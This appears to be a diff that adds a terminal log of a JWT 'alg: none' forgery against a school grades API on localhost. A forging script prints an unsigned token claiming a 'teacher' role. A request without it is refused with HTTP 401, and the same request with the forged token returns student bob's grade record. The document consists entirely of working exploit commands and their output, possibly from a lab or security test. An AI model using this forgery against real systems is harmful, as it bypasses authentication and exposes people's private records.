@@ -1,0 +1,24 @@
+$ python3 jwt/forge_none.py
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjo5OTk5LCJ1c2VybmFtZSI6ImF0dGFja2VyIiwicm9sZSI6InRlYWNoZXIifQ.
+
+$ curl -k -s -w "\nHTTP %{http_code}\n" https://localhost/api/notes/3
+{
+  "error": "unauthorized"
+}
+
+HTTP 401
+
+$ curl -k -s -w "\nHTTP %{http_code}\n" https://localhost/api/notes/3 \
+  -H "Authorization: Bearer $FORGED"
+{
+  "class_id": 1,
+  "class_name": "Mathematics",
+  "comment": "Solid work, keep it up.",
+  "grade": 12.6,
+  "id": 3,
+  "student": "bob",
+  "student_id": 7
+}
+
+HTTP 200
+
